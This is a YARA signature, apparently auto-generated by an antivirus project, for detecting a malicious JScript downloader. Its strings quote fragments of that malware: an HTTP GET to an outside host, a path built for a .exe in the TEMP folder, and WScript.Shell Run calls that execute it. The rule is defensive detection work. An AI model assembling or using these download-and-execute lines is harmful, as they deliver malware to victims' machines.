rule sig_20160329_9f79cebd39f5ac7fae8524da75145885 {
  meta:
    description = "datamaliciousorder - file 20160329_9f79cebd39f5ac7fae8524da75145885.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7875a9e759a889d415c72d177f86503afec0a47854426f8d06d439027a5dde58"

  strings:
    $s1  = "pB[sl](\"GET\", \"http://icurlers.com/sodp1os\", false);" fullword ascii
    $s2  = "function nR() {return zl[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2DA0V7avWvfAWP.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[wd](ys() * 11); if (pB[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function b(T, g){hg = hg * 1; return T - g;};" fullword ascii
    $s5  = "var zl = function OI() {return WScript[sI](\"WScript.Shell\");}(), TS = 11;" fullword ascii
    $s6  = "function br(){return \"\" + M0;};" fullword ascii
    $s7  = "function Q(uY){zl[\"Run\"](uY, hg, hg);};" fullword ascii
    $s8  = "function U() {return ((u == true) && (u == d)) ? 1 : hg;};" fullword ascii
    $s9  = "function M()" fullword ascii
    $s10 = " while (mD){" fullword ascii
    $s11 = "var pf = new this[\"Date\"]();" fullword ascii
    $s12 = "return b(SK, B);" fullword ascii
    $s13 = "function ys(){return 22;};" fullword ascii
    $s14 = "function MC(){return sI;};" fullword ascii
    $s15 = "function R(z) {var i = (1, 2, 3, 4, 5, z); return i;};" fullword ascii
    $s16 = "var Z = false;" fullword ascii
    $s17 = "d = true; " fullword ascii
    $s18 = "var d = false;" fullword ascii
    $s19 = "var u = false;" fullword ascii
    $s20 = "u = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}